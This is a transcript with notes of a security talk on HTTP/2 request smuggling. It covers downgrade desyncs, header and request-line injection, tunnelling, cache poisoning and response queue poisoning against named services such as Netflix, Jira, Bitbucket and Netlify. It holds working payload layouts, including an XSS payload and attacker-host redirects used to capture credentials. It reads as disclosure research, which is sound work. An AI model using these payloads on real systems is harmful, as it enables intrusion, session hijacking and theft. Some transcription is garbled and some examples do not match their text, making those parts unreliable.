### Introduction
good afternoon and welcome to http 2 the sequel is  always worse. have you ever seen something that was so  complex it just had to be hackable if only you had time  to understand it. http 2 is a beautiful beast, but  it is complex and where this complexity people take shortcuts, and things go wrong. in this session i'm going to show you  how you can use new features in h2 for a range of high  impact attacks, and i'll also show how those shed light  on a type of request smuggling , that has always existed but nobody really noticed. 
complexity causes trouble for me too. i first looked at the h2 spec way back  in 2019 when i was doing the research for http desync attacks.  and i loaded up the spec, i looked at the size of the browser scroll bar, and then  i proceeded to skim read it so fast that i didn't even read the security  considerations. my next encounter with h2 was after i  delivered that presentation in 2019, an audience member asked me did those  techniques work on h2.  and my answer was no it was completely secure against these types of  attacks. and that was that until my third  encounter which was that same day at a party in vegas, after a few drinks,  someone asked me the same question and i gave them the same answer and then they  proceeded to explain to me exactly how you could exploit systems using request  smuggling over http 2. this next bit is tricky to explain  without coming off badly ,but at this point in time i just been handed an  amazing lead yes but on the other hand i'd just spend nine months  exploiting request smuggling. so the prospect of doing more request smuggling  exploitation didn't exactly fill me with joy, and i just went off and spent a year researching cache poisoning instead.  when i came back, one year later i tried this idea out and found yet it really  worked i could hack loads of interesting systems in exciting new ways and there  was just one fly in the ointment, and that was a bit bucket.  every heuristic that i tried said that bitbucket should be vulnerable,  but every actual exploit i tried reliably failed. and normally when i encountered something  like this during research i would spend a bit of time on it and then just give  up and move on. but i'd already encountered a scenario  much like this during my original httph desync attacks search. i was  determined not to let it escape me a second time.
```
2019-08: HTTP Desync Attacks
2020-09: The Bitbucket mystery
```
so i did continue with exploiting other sites, refining the techniques and i  also kept coming back to bitbuckent repeatedly trying to crack it nand  getting nowhere until january when thanks to an incredibly lucky accident,  i got i am proof that this system was really vulnerable to request smuggling. 
```
2021-01:Bitbucket confirmed... but uneexploitable
```
however i still couldn't actually exploit it and after spending a bunch  more time on it i just gave up and told atlassian, hey there you've got this  suspicious behavior on your site technically it's vulnerable but  practically i think this is probably harmless  you might want to patch it you might not it's up to you.  aside from that though everything was going really well with this research, until around march when emily published a bunch of research that he'd been doing  at the same time as me on the same topic.  this meant that my presentation would lack anything truly groundbreaking  because it was all in his presentation which was published beforehand, unless i could find something entirely new. and so naturally i went back to bitbucket and this time i finally  cracked it and this led to a sequence of events.
```
2021-03: Research collision
2021-03: BItbucker breatrhough cascade
 - New, more powerful type of desync
 - Entire issue class becoming exploitable
 - Atlassian logging everyone out of Jira
 - Contacting CERT, awardin 3x{max bounty}
```
i found a new more powerful type  of desynchronization attack, an entire class of issue that was  previously basically useless became practically exploitable,  atlassian had to log everybody out to there worldwide, and got the computer  emergency response team involved and awarded me with triple their maximum  bounty. so  out of that mess i've managed to extract some information that i hope you'll find  really quite useful, regardless of whether you've seen emil's presentation  already or not. i'm not gonna tackle this topic in  chronological order, because uh it doesn't make sense even to me looking at  it in retrospect. instead first i'm going to show how you can use http 2 for  request smuggling. then i'll focus on the quest  tunneling and show practical techniques to confirm and exploit it.  then i'll take a look at five new h2 exploit primitives,  and then cover some miscellaneous odds and ends and how to defend against these  attacks. and then take five minutes of questions. also if you're watching this  live you may be able to ask questions using a chat box on the right, uh if not  just tag me on twitter and i'll answer there instead.

### Key Differences betwen http1 and http2
so although http 2 is complex, there's  only actually four key things that you need to understand in order to  effectively wield it as a weapon.
HTTP/1.1:
```
POST /login HTTP/1.1\r\n
Host: psres.net\r\n
User-Agent: burp\r\n
Content-Length: 9\r\n
\r\n
x=123&y=4
```
HTTP/2
```StreamID: 1
:method     POST
:path       /login
:authority  psres.net
user-agent  burp
x=123&y=4
```
here you can see an identical request, represented in http1 and http 2. the first key difference is pretty  obvious it's that where h1 has the request line containing the method in  the path, h2 has done away with this concept and  they've replaced it with pseudo headers, these look like headers but they start  with a colon and they can the information in the request line, and  also there's the colon authority header which replaces the host header.  the second key difference is that http1 is a plain text protocol so that means  that server parsing of requests is done using string operations, for example  servers have to look for new lines to know when one header ends, and the next  header starts. on the other hand hv2 is a binary  protocol mostly using key value pairs so what i'm showing you on these slides  whenever i represent http 2 request is an abstraction it's not the  actual bytes on the wire and, specifically the pseudo the pseudo  headers like colon method on headers that are literally called "codon  method", they actually map to a number like the byte one.  this approach of having a binary protocol  with most string parsing involved of course means there's a lot less  potential for ambiguity in http 2 messages, the third key difference is that in order to specify the length of the  message http one is relying on the content length header or the transfer  encoding chunk header. http2, meanwhile, has this built-in  frame length concept that makes those headers, redundant and once again, means  it's not really possible to send a http 2 message that is ambiguous about its  length, and that's the reason that i thought that request smuggling against  http 2 wasn't possible. the final key difference is to do  with the way that the two protocols handle multiple requests being sent over  a single connection. with http one it's super simple, you send your request  down your socket, you read the response back and you just stick another request  straight down that same socket.
```
POST /login HTTP/1.1\r\n
Host: psres.net\r\n
User-Agent: burp\r\n
Content-Length: 9\r\n
\r\n
x=123&y=4GET / HTTP/1.1\r\n
Host: psres.net\r\n
\r\n
```
so this is exactly what it looks like on the  wire and you just read back the response in the same way, so you'll rely on the  responses coming back in the order that you sent the requests.  in hv2 they've  replaced this concept with the concept of streams, a stream is simply a request  response pair,  and every frame which is the underlying hp2  data type that we mostly don't care about, has a stream id and that's how the browser knows which responses should be  associated with which requests. 
```StreamID: 1
:method     POST
:path       /login
:authority  psres.net
user-agent  burp
x=123&y=4
```
```StreamID: 1
:status 403

FAILED
```


```StreamID: 3
:method     GET
:path       /robots.txt
:authority  psres.net
```
```StreamID: 3
:status 403
User-Agent: *
Disallowed: /
```
and uh yeah that's pretty much it that's  all you need to know to do all the exploits coming up.

### Explotation
so now that we understand hd2, let's see what damage we can do.  as usual in this section i've only targeted real systems with bug bounty  programs, all of these findings were detected with an automated open source  tool that i'll be releasing at the end of this presentation, and of any boundaries and half of being donated to local charities and the other  half has been spent on beer.  if at any point you find the covering of exploitation in this section is going  too fast and you haven't already seen my http dsync attacks presentation you  might want to pause it and check out that because it covers  similar exploitation techniques ,at a much more sedate place.  
so why is hv2 request smuggling possible?  well it's because the vast majority of servers that speak http 2  actually speak http1 to the back-end, they speak http2 with the client and http 1 with  the backend, they're rewriting requests on their way in and i'm going to refer  to this behavior as http2 downgraded. this setup is ridiculously common, for example in amazon's application load balancer,  you literally can't disable this if you turn on http2 yes it will speak http2 with  the client but it there's no way to make it speak http2 to the back end system,  you're going to land up in this configuration which effectively  dodges all the security benefits that http2 is supposed to bring you.  in fact it kind of makes things worse, because  http1 based requests request smuggling occurs when the front end and the back  end disagree about whether to use the content length or the transfer encoding  chunked header to determine the length of a message, meanwhile if you turn on hb2 on the front end but  do downgrading, well, the two systems can't agree, because they don't have  access to the same data the front end is guaranteed to use the built-in http 2  message length, and then  the back-end doesn't have access to that message length because it's not speaking  http2 and it's forced to use the content length or the transfer encoding chunk header.
```
HTTP/2 downgrade smuggling is H2.CL or H2.TE
```
if this sounds like a mess, that's because it is.  effectively if you take your front end and you turn on  http 2 support you've just doubled the number of ways that you may be  vulnerable to request smuggling, congrats

### Case study Netflix
so let's begin with an extremely simple  case study the hd2 rfc says  that you're allowed to send a content length header over http 2 even though  it's not required and is almost  pointless, they say you're allowed to send it  provided that it's correct, so what could possibly go wrong with  this? well, netflix used the neti java library and  they forgot to verify that the content length was correct. so if i send a http2 request like this then when downgraded  it would look like this:
Front-end
```
:method           POST
:path             /n
:authority        netflix.com
content-length    4
abcdGET /n HTTP/1.1
Host: 02.rs?x.netflix.com
Foo:bar
```
**Back-end**
```
POST /n HTTP/1.1
Host: www.netflix.com
Content-Length: 4

abcdGET /n HTTP/1.1
Host: 02.rs?x.netflix.com
Foo: bar
```
and the data shown in orange (la request siguiente a abcd) would be  prepended to the start of the next request coming from someone else to hit  the back-end and would thereby redirect them to my server.
**Back-end**
```
POST /n HTTP/1.1
Host: www.netflix.com
Content-Length: 4

abcdGET /n HTTP/1.1
Host: 02.rs?x.netflix.com
Foo: barGET /anything HTTP/1.1
Host: www.netflix.com
```
```
:method    GET
:path      /anything
:authority netflix.com
```
i could just run this in a loop in real time and  effectively redirect everyone browsing their site and potentially  hijack script imports ,thereby getting persistent control over their  account, and being able to do stuff like maybe steal plain text passwords and  credit card numbers. for this i got a 20 000 bounty of netflix and a patch has been applied to upstream netflix.  after that motivating start let's move on to something slightly more complex
### Case study amazon
the http2 rfc says any message containing connection specific header fields, must  be treated as malformed, but it's kind of vague about what happens if  you don't do this so i'm going to fill in the blanks. quite a few servers don't do this,  one on such server is amazon's application load balancer, it's it's  it's now being patched but at the time you could exploit tons of servers like  this and one such server was it's law enforcement portal.
*any message contining connection-specific header fields MUST be treated as malformed*
```Front-end
	:method        POST
	:path          /dentify
:autorithy         id.b2b.oath.com
transfer-encoding  chunked
0

GET /OOPS HTTP/1.1
Host: psres.net
Content-length: 10

x=
```
```Back-end
POST /identity/XUI/ HTTP/1.1
Host: id.b2b.oath.com
Content-Length: 68
Transfer-Encoding: chunked

0

GET /oops HTTP/1.1
Host: psres.net
Content-Length

x= 
```
here i've sent a request using transfer encoding chunked which is a connection  specific header field that should lead to the message being rejected, and it's  just been forwarded onto the back end, so the back end is  prioritized the chunks encoding over the correct content length and once again  i've gained the ability to redirect arbitrary live users to my  website. what i found was that i kept redirecting people who were in the  middle of login flows and thereby they ended up leaking their oauth  authentication codes to me via the referral header,
```Back-end
POST /identity/XUI/ HTTP/1.1
Host: id.b2b.oath.com
Content-Length: 68
Transfer-Encoding: chunked

0

GET /oops HTTP/1.1
Host: psres.net
Content-Length

x= GET /?...&CODE=SECRET HTTP/1.1
```
```
GET /b2blanding/show/oops HTTP/1.1
Host: psres.net
Referer: https://id.b2b.oath.com/?...&code=secret
```
as well as affecting everything behind amazon's application load balancer this  also affected everything behind encapsulated web application firewall  which is ironically meant to make your website more secure.  i reported this and got a 7 000 bounty off oath for it,  notably i reported this to both amazon and encapsula and didn't get a bounty  off either, the people that write the vulnerable code are not necessarily the  people who have to take responsibility for the result.
### H2.TE Desync. Header hijack
on another target, also using amazon application  load balancer, i found the same exploit technique worked
```
POST /account/login HTTP/1.1
Host: accounts.athena-aol.com
Content-Length: 104
Transfer-Encoding: chunked

0

GET /account/1/logout?next=https://psres.net/ HTTP/1.1
X-Ignore: X 

```

but when i triggered redirects i got an even more interesting request  landing on my server. it said "hello there, i'd like to have permission  to send you my credentials"
```
POST /account/login HTTP/1.1
Host: accounts.athena-aol.com
Content-Length: 104
Transfer-Encoding: chunked

0

GET /account/1/logout?next=https://psres.net/ HTTP/1.1
X-Ignore: X GET /??? HTTP/1.1

OPTIONS / HTTP/1.1
Host: psres.net
Access-Control-Request-Headers: authorization
```

so i reconfigured my service, so i said  "yeah absolutely sure, send me your credentials"
```
HTTP/1.1 200 OK
Access-Control-Allow-Credentials: true
Access-COntrol-Allow-Headers: authorization
```
and sure enough they did i  have a fantastic video from tcp dump showing credentials streaming  onto my server in real time, but unfortunately it was nearly impossible  to to adapt, so i gave up and i can't share it.  there's an interesting side point here which is if this website had been using  cookies for authentication, this exploit would not have worked because the  browser wouldn't have sent the cookies for one host to a to a  different host, that's not to say cookies are better for  authentication they're terrible just in different ways. for that i got a 10 000 bounty taking the total to 37k  

so that was the basic stuff now things are going to get a bit more interesting.  one cool thing about h2 is that because it's a binary protocol it lets you put  arbitrary characters, wherever you like and it relies on an extra layer of  server logic saying things like "nope you shouldn't be putting new lines in  headers". firefox's start page was powered by the  netlify cdn and they forgot to enforce this requirement, so as shown here this  led to a request header injection vulnerability, which i could use to  inject a transfer encoding chunk header and trigger requests  smuggling and serve up content from other sites on the netlify cdn. 
```Font-end
:method      POST
:authority   start.mozilla.org
:path        /
foo          b\r\n
            transfer-encoding: chunked
0\r\n
\r\n
GET / HTTP/1.1\r\n
Host: evil-netlify-domain\r\n
Content-Length: 5\r\n
\r\n
x=
```
```Back-end
POST / HTTP/1.1\r\n
Host: start.mozilla.org\r\n
foo: b\r\n
Transfer-Encoding: chunked\r\n
\r\n
0\r\n
\r\n
GET / HTTP/1.1\r\n
Host: evil-netlify-domain\r\n
Content-Length: 5\r\n
\r\n
x=
```
such as  one that i control, and they had a cache so that effectively  let me do cache poisoning and take persistent control over every page of  every site on the netify cdn.
```Font-end
:method      POST
:authority   start.mozilla.org
:path        /
foo          b\r\n
            transfer-encoding: chunked
0\r\n
\r\n
GET / HTTP/1.1\r\n
Host: evil-netlify-domain\r\n
Content-Length: 5\r\n
\r\n
x=
GET /poisoned9.js HTTP/1.1
Host: start.mozilla.org
```
```Back-end
POST / HTTP/1.1\r\n
Host: start.mozilla.org\r\n
foo: b\r\n
Transfer-Encoding: chunked\r\n
\r\n
0\r\n
\r\n
GET / HTTP/1.1\r\n
Host: evil-netlify-domain\r\n
Content-Length: 5\r\n
\r\n
x=GET /poisoned9.js HTTP/1.1\r\n
Host: start.mozilla.org\r\n
```
for this i got 2k off netlife and 2k off  mozilla

### Case Study jira
when i tried the same technique on  atlassian enduro something really quite interesting happened. i expected to see  two responses coming back a normal one and a poisoned one, but i actually got a  huge range of responses clearly coming from  different jira deployments intended for different people  and containing a huge amount of sensitive information. as you can see here hopefully i would acted all the properly sensitive stuff. this left me one thing what exactly had happened, i did not expect that, and eventually i was able to figure it out and the problem: was  i had realized that using this new lines and headers technique i could place  my malicious prefix inside the value of the foo header and thereby avoid the  need for a body or using transfer encoding chunks or even needing to use  the post method. 
```
:method          GET
:authority       eco.atlassian.net
foo              bar
                 Host: eco.atlassian.net

GET /robots.txt HTTP/1.1
X-Ignore: x\r\n
\r\n
```
so i smuggled a request that looks like  this, and i thought i was doing the normal technique of sending 1.5 requests  to the back end, thereby poisoning the next request to hit the end point.  but i failed to account for the fact that the front end  because it viewed this injection as happening in the headers it was just  going to terminate the headers normally,
```Back-end
GET / HTTP/1.1
Foo: bar
Host: eco.atlassian.net

GET /robots.txt HTTP/1.1
X-Ignore: x
Host: eco.atlassian.net\r\n
\r\n
```
so  when they put their extra two black lines on the end, as per rfc spec, the end  result was i smuggled exactly two requests to the back end.  
so i got the response to the first  request, and the second response just kind of sat there on the back end  waiting until someone else sent a request to the server. 
![[Pasted image 20240816111318.png]]
then they got the  response intended for me, and what about the response in in  intended for them? well that sat on the server and waited for the next person, and so, basically jira lost track of which  responses should be going to which people and end up serving incorrect  responses, not just to me but to everybody everyone was getting random  responses intended for other people.  thanks to the set cookie header some  of those would be persistently logging random users into random accounts,  which is why after doing some hot fixes at last seen expired every jira session  worldwide logging everybody out. the root cause of this vulnerability was  the post-secure virtual traffic manager front end which should not be confused  with pulse secures vpn. we also saw this technique worked on  netlify and, as usual it worked on impervious WAF as well.
## Hotfixes

### H2.TE via request line injection
while waiting for the pulse secure fix atlassian tried out a few hot fixes  and a couple of things went wrong here. 
```Front-end
:method      POST
foo          chunked
transfer-encoding
```

```backe-end
GET / HTTP/1.1
foo
transfer-encoding: chunked
host: ecosystem.atlassian.net
```
so the first issue was they filtered new  lines and header names but not inside in header values,but not in header names.  
**Problem:**
```frontend
:method          GET
               Transfer-encoding: chunked
                 x: x
:path            /ignored
```
```back-end
GET / HTTP/1.1
transfer-encoding: chunked
x: x /ignored HTTP/1.1
host: ecosystem.atlassian.net
```
direct exploitation of that didn't work because it results in an invalid  request ,as you can see. 
but  you can put colons in here names in http 2, and using that you could get the  exploit once again working. 
**Solution:**
Frontend HTTP2

| Name              | Value    |
| ----------------- | -------- |
| :method           | chunked  |
| foo: bar          | chunked  |
| transfer-encoding | HTTP/1.1 |

```back-end
GET / HTTP/1.1
foo: bar
transfer-encoding: chunked
host: ecosystem.atlassian.net
```
another issue was that they filtered header names ,and  head of values but failed to filter pseudo headers so  you could inject new lines in the request line, so here i've put the entire  payload in the method 

**Pseudo-headers unfiltered (http2 frontend)**

| :method | GET / HTTP/1.1<br>Transfer-Encoding: chunked<br>x: x |
| ------- | ---------------------------------------------------- |
| :path   | /ignored                                             |
**http1.1 back.end**
 ```back-end
GET / HTTP/1.1
transfer-encoding: chunked
x: x /ignored HTTP/1.1
host: ecosystem.atlassian.net
```
when you're doing this just think  about what the resulting request is going to look like when it gets  downgraded or otherwise you'll end up with an invalid request and the attack  will fail.
finally this is a classic one: they in the path they only block the slash r slash n sequence, they didn't  block slash n by itself and typically slash n is all you need for a successful  exploit. 

| :method | POST                                                                                         |
| ------- | -------------------------------------------------------------------------------------------- |
| :path   | ```/ HTTP/1.1\n<br>Hosta: exo.atlassian.net\n<br>\n<br>GET /robots.txt HTTP/1.1\n<br>x: x``` |
 ```back-end
GET / HTTP/1.1
transfer-encoding: chunked
x: x /ignored HTTP/1.1
host: ecosystem.atlassian.net
```
so in summary, in this section we've seen  a whole range of techniques that you can use to exploit hdb2 downgrades and  achieve requests smuggling.

## Tunneling
now i'm going to take a look at something less flashy less obvious but  still really quite dangerous, and in case you're wondering yet this is  the vulnerability that i found on bitbucket.

|                             | Rule bypass, header spoofing | Internal header theft | Cache poisoning | Direct cross-user atacks | Response queue poisoning |
| --------------------------- | ---------------------------- | --------------------- | --------------- | ------------------------ | ------------------------ |
| No-reuse                    | X                            |                       |                 |                          |                          |
| Cliente-connection affinity | X                            | X                     | X               |                          |                          |
| Client-IP affinity          | X                            | X                     | X               | /                        |                          |
| Full                        | X                            | X                     | X               | X                        | /                        |
| Pipelined                   | X                            | X                     | X               | X                        | X                        |

when you find a request smuggling vulnerability the possible attacks your  options are affected by how the front end reuses the connection  with the back end.  in a typical scenario they just reuse  connections more or less randomly, there's no real restrictions on your  attacks but sometimes they will only reuse a given connection for requests  coming from the same client ip,  or even worse only for requests coming over the same  client connection, which makes exploitation of other users directly  very difficult. but the worst case of all the most  challenging one is when they just don't ever reuse connections to the back end, this creates a range of different problems and challenges and this is the  scenario that we had on bitbucket. i'm going to be exploring in detail today in particular i'm going to show you how to prove this vulnerability even  exists and share some new exploit  parts foot.

|                             | Rule bypass, header spoofing | Internal header theft | Cache poisoning | Direct cross-user atacks | Response queue poisoning |
| --------------------------- | ---------------------------- | --------------------- | --------------- | ------------------------ | ------------------------ |
| No-reuse                    | X                            | X                     | X               |                          |                          |
| Cliente-connection affinity | X                            | X                     | X               |                          |                          |
| Client-IP affinity          | X                            | X                     | X               | /                        |                          |
| Full                        | X                            | X                     | X               | X                        | /                        |
| Pipelined                   | X                            | X                     | X               | X                        | X                        |

so let's visualize what's happening here:
```
POST /n HTTP/1.1
Host: example.com
Content-length: 4

abcdGET / HTTP/1.1
Host: example.com
```
```
HTTP/1.1 302 Found
Content-Length: 5

movedHTTP/1.1 200 OK
Content-Length: 100

<html><body>BLAH
```
as usual the orange data is being treated as a separate request by the  back end(lo que le sigue al "abcd" y "moved") but  because this socket is being discarded by the front end, after what it thinks is  one request, has been sent down here any follow-up  requests regardless of whether they're coming from the attacker or from a  potential victim are going down a different socket, and are being  completely unaffected. this configuration happens naturally in  the wild and it's also deliberately triggered by amazon's http  desync guardian as a way of  when it sees suspicious uh request as a way of mitigating any  harm that might be done. it's worth noting that their decent guardian didn't  have any effect on any of the hp2 attacks, shown earlier so this behavior causes a bunch of practical problems, let's have a look at what they are and how to deal with them.
the first problem is that although the classic time-out based request smuggling  detection technique works even in this scenario, the normal confirmation  technique will always fail so it's easy to mistake this vulnerability for  a time for false positive caused by timeouts. you might think it's quite easy to recognize the scenario just smuggle a  request like so and see if you get two responses as you can see  here.
```Request
POST / HTTP/1.1
Host: example.com
Transfer-Encoding: chunked

0

GET / HTTP/1.1
Host: example
```
```Response
HTTP/1.1 301 Movex Permanently
Content-Length: 162
Location: /en

<html><head<title>301 Moved...

HTTP/1.1 301 Moved Permanently
Content-length: 162
```
but unfortunately  this response doesn't show that this target is actually vulnerable,  because this is how http 1.1 is supposed to work,  unless we're able to answer the question does the front end think it's sending us  one response or two this doesn't tell us whether they're  vulnerable or not. http2 however  answers this question extremely cleanly for us 

| :method           | POST        |
| ----------------- | ----------- |
| :path             | ```/```     |
| :authority        | example.com |
| transfer-encoding | chunked     |
| `\r\n`            |             |
| 0                 |             |
| GET / HTTP/1.1    |             |
| Host: example.com |             |

| :status                                       | 301       |
| --------------------------------------------- | --------- |
| location                                      | ```/en``` |
| ```\r\n```                                    |           |
| ```<br><html><head><title>301 Moved...<br>``` | chunked   |
| ```<br>Content-Length: 162...<br>```          |           |

because  if you see http 1.1 headers and a hp 1.1 response nested inside the body of a http2  response, well yeah that proves that they are in fact definitely vulnerable.
the second problem is that request tunneling  vulnerabilities like this are often blind because  the front end will look at the content length coming back from the from the  response, and only read that many bytes, so we have a common scenario where we  can smuggle a second request, we can trigger  two responses from the back end but the second response  is never read in by the front end and it's never passed on to us  as the as the attacker and this makes detection and exploitation extremely  difficult.
```REQUEST
POST /images/tiny.png HTTP/1.1
Tranasfer-Encoding: chunked

0

POST / HTTP/1.1
```
```Response
HTTP/1.1 200 OK
Content-Length: 7

content
```
(nunca leído por el front-end)
```
HTTP/1.1 403
```

 this behavior was present on  bitbucket. fortunately for me i had an extremely  fluky breakthrough here the response that i happened to be testing, on  bitbucket, was some binary file download and it was huge it was so huge that it  made burp's ui lag every time it loaded in the repeater.  and aside from trying to get the team to fix the performance issues in burp i  thought you know what i don't even care about the size of this response, i don't  care about the body at all all, i'm really looking at is the response  headers so instead of using a post why don't i  just use a head and only ask for the response headers, so i sent a head.
 ```REQUEST
HEAD /images/tiny.png HTTP/1.1
Tranasfer-Encoding: chunked

0

POST / HTTP/1.1
```
```Response
HTTP/1.1 200 OK
Content-Length: 7

HTTP/1.1 403
Content-Length: 3973
```
  and what i got back in included a nested second  http one response. that's because when you send a head  it makes the back end send a response that has no  body but it may still contain a content length, so it may still trigger the front  end to try and read some extra bites off the socket,  and effectively you can use head to make request tunneling vulnerabilities  non-blind maybe 50 of the time.
### Confirm tuneling
so let's say you've confirmed your tunneling hopefully made it non-blind  ¿how do you exploit it? well,  you can't directly attack other users so  you've got two main options: you can bypass front-end security rules like  attempts to block you from certain paths and stuff which is straightforward and  boring or you can try and tunnel internal  headers, 
often front end servers put on internal headers that say things  like who the user is authenticated as and these are  implicitly trusted by the back end. but there's a catch with exploiting  internal headers which is that to exploit one you need to know what they  are internal headers the front end is putting onto the request in the first  place. with request tunneling it's  impossible to use normal known techniques to directly  discover them, but  if you can inject new lines into header values or header  names or anywhere in the headers really  you can trigger a different new kind of desynchronization, instead of causing  a disagreement about where the body ends between the front end and the back end  you can cause a disagreement about where the body starts,

| :method           | POST                                                                    |
| ----------------- | ----------------------------------------------------------------------- |
| :path             | ```/blog```                                                             |
| :authority        | bitbucket.org                                                           |
| foo               | bar<br>Host: bitbucket.wpengine.com<br>Content-Lnegth: 200<br><br>s=cow |
| foo=bar           |                                                                         |
```Request
POST /blog HTTP/1.1
Foo: bar
Host: bitbucket.wpengine.com
Content-Length: 200

s=cow
SSLClientCipher: TLS_AES_128
Host: bitbucket.wpengine.com
Content-Length: 7

foo=bar
```

if effectively you're doing a desynchronization in the headers  directly rather than the bodies, that leads to us being able to do what i'm  showing here, where i'm i'm sending what the front end and the back end both  regard as one request, but the back end thinks the body starts  where it says "s equals cow" and thereby they think i'm  searching for the values of the internal headers that the front end put on and  they will hopefully reflect them back to me, leaking them so i can try to exploit.
```
<title> You searche for cowSSClientCipher: TLS_AES_128_GCM_SHA256,version=TLSv1.3, BITS=128Host: bitbuecket.wpengine.comSSLSessionID:
...
```

i also found different paths on bitbucket would get routed to different back ends with different  internal headers including some that had some secret keys in the headers, which  was pretty cool.

| :method | POST                          |
| ------- | ----------------------------- |
| :path   | ```/!api/internal/snippets``` |

if you want to see a full exploitation work through using internal headers  check out my new relic  case study from the http desync attacks presentation. so, there's one last possibility  when the scenario is right sometimes if  you've got requests tunneling and you can inject  and you can cause a header-based dsync, and they're using a cache, and the head technique works, then you can do  cache poisoning is already one of the highest severity attacks  possible with with request smuggling and the head  technique enables a unique and extra powerful variety whereby you can  effectively mix and match response headers and response bodies. so here i've smuggled a  a head and thereby triggered the headers from a normal  404 page with the content type of text html

| :method    | HEAD                                                                                                        |
| ---------- | ----------------------------------------------------------------------------------------------------------- |
| :path      | ```/blog?x=dontpoisoneveryone```                                                                            |
| :authority | bitbucket.org                                                                                               |
| foo        | ```bar<br>Host: x<br><br>GET /wp-admin?<svg/onload=alert(1)> HTTP/1.1<br>Host: bitbucket.wpegine.com<br>``` |
```Response
HTTP/1.1 404 Not Found
Content-Type: text/html
X-Cache-Info: cached
Content-Length: 5891

HTTP/1.1 301 Moved Permanently
Location: https://bitbucket.org/wp-admin/?<svg/onload=alert(1)>
```
and then thanks to their head overlead behavior i've used the nested get to  trigger a different response, that reflects my input unencoded in the  location header, normally that location header behavior  is completely safe there's nothing wrong with that reall, but by combining these  two responses i've got arbitrary javascript  execution and because it's cache poisoning that gives me full control  over every page on the site. 
for this exploit plus the stuff on  atlassian joe as seen earlier i got 15k triple their max bounty taking the total  earn during this research to 56k.

## HP2 Exploit Primitives
now i'm going to take you on a tour of hp2 exploit primitives, each of these  uses a h2 feature to get some kind of for hold on the target and they're all  based on real behaviors observed on real systems.
in h1 duplicate headers cause all kinds of  issues but there's no way to specify a duplicate path or a duplicate method,  but thanks to the design of pseudoheaders sometimes on some servers  you can, and servers do treat requests with multiple paths  inconsistently. so there's definitely going to be some interesting exploits  coming up using that technique 
**Duplicate path, method, scheme**

| :method    | GET                   |
| ---------- | --------------------- |
| :path      | ```/somepath```       |
| :path      | ```/different-path``` |
| :authority | example.com           |

also  in htt2 they've introduced the authority pseudo header which kind of replaces the  host, but both of them are allowed and i believe both of them are optional so this creates ample ways that you can have ambiguity about your request and  ensures that host header attacks will live up
**Host-header attacks**
:authority and host both specify the host... and are both optional!

| :method    | GET                                                                                                         |
| ---------- | ----------------------------------------------------------------------------------------------------------- |
| :authority | excample.com                                                                                                |
| host       | attacker.com                                                                                                |
### URL prefix injection
they also introduce the colon scheme pseudo header, and this is pretty much a novel  attack surface and as such a whole bunch of people do no validation on this value it's supposed to just be http  or https, but a bunch of targets use it to build urls. it's worth mentioning both the techniques here work on targets even if  they aren't doing hv2 downgrading, even if they're speaking http to end to end  this one's still worth a shot. 
**Path override**

| :method    | GET                           |
| ---------- | ----------------------------- |
| :path      | /ffx36.js                     |
| :authority | start.mozilla.org             |
| :scheme    | http://start.mozilla.org/xyz? |
```
HTTP/1.1 301 Moved Permanently
Location: https://start.mozilla.org/xyz?://start.mozilla.org/ffx36.js
```
first of all on netlife you could put a  full url in the scheme, and thereby confuse them about what  about what was the host what's the path and so on,  and on a different target they were using it to construct a url that they  would then send the request to so you could make them try to send the request  to the wrong destination, just using the scheme.
**Enabling Host-header attacks**

| :method    | GET               |
| ---------- | ----------------- |
| :path      | /ffx36.js         |
| :authority | redacted.com      |
| :scheme    | http://psrres.net |
```
'Host' header value of request to "http://psres.net/://redacted.com/"
doesn't match request target authority
```
### Header name splitting
another cool thing you can do in http one, that sometimes leads to request  smuggling is just using a colo, sometimes you'll find you can put a  colon in a header name but you can't use new lines. and you'll only occasionally  get request smuggling with this because the server is going to put this annoying  extra colon on the end, that's supposed to signal the start of  the value.

| :method                   | POST         |
| ------------------------- | ------------ |
| :path                     | /            |
| :authority                | redacted.com |
| transfer-encoding:chunked |              |
```
GET / HTTP/1.1
Host: redacted.net
transfer-encoding: chunked:
```

this behavior is often going to be more  suited to host header attacks where servers expect a colon in  in the value and they often ignore everything  after the colon, that said i did use this to get request smuggling on one target  and i got halfway through exploitation and then the vulnerability disappeared. somewhat annoyingly and the server banner reported that they'd updated  their installation of apache. 

| :method         | GET         |
| --------------- | ----------- |
| :path           | /           |
| :authority      | example.com |
| host: psres.net | 443         |
```
GET / HTTP/1.1
Host: example.com
Host: psres.net: 443
```

so i went looking for an advisory in  apache security releases and i couldn't find anything, so i thought okay i'll  install the vulnerable version of apache locally i'll get an advisory issued even  though technically there's already a patch  available might as well and maybe i'll use it for a demo. so i installed it locally and i couldn't replicate the vulnerability i  still don't know why maybe it's vulnerable maybe it isn't but what i did  do was find a different vulnerability in apache. what i found was when mod proxy is used for hv2 downgrading they let you put a  space or as many spaces as you like in the request method, so that triggers a  request line injection  vulnerability. 
**bypass block rules**
```
<ProxyMatch "/admin">
Deny from all
```

| :method    | GET /admin HTTP/1.1 |
| ---------- | ------------------- |
| :path      | /fakepath           |
| :authority | psres.net           |

on some servers the fact that you'll end up with training junk in  the request line will make this useless but on a bunch of  them everything after the hd 1.1 the first issue 1.1 will be ignored, and you'll be able to exploit this to do things like bypass  attempts to block access to certain folders and also to escape from certain  folders on the back end that they're trying to trap you in sight.

| :method         | GET / HTTP/1.1 |
| --------------- | -------------- |
| :path           | /fake          |
| :authority      | psres.net      |
```
GET / HTTP/1.1 /public/fake HTTP/1.1
Host: internal-server
```
at the time of this being recorded there's no patch available for this but  i'm cautiously optimistic that one will be available by the time that you're  watching this.
### Hidden-HTTP/2
finally a few practicalities hd2 and hp1 are spoken over the same  port, so in order for a client like a browser  to know which protocol to speak it's reliant on the server advertising the  fact that it supports hp2 during the ssl handshake. and some servers do support hv2 but they forget to advertise this which means no  clients will speak http 2 with them by default. this can lead to you missing some extremely valuable and juicy attack  surface, but fortunately it's extremely easy to detect this in a number of ways  and take advantage of it.
 - HTTP/2 and HTTP/1.1 share the same por
 - Servers advertise HTTP/2 support via ALPN field in TLS handshake
 - Some forget
 **Detect with:**
  - HTTP Request Smuggler 'Hiden-H2'
  - Burp Scanner
  - curl --http2 --http-prior-knowledge
i even found a real  example where they had this behavior and the hb2 setup was exploitable but  somewhat amusingly it only let me exploit other people using http 2, which  was nobody so it was useless.
another potential pitfall is that although hp2 is supposed to be great  about separating requests into streams and so on sometimes a stream will break  all subsequent streams on that connection, and and other times the first stream on any  connection will be treated  certainly differently by the front end so there are approaches you can use to  manage this behavior, but it's also something that  seems quite interesting as a target for further research so i'll be looking into  this shortly. 
 - HTTP/2 promises great request encapsulation
	 - Sometimes requests brak all subsequent request
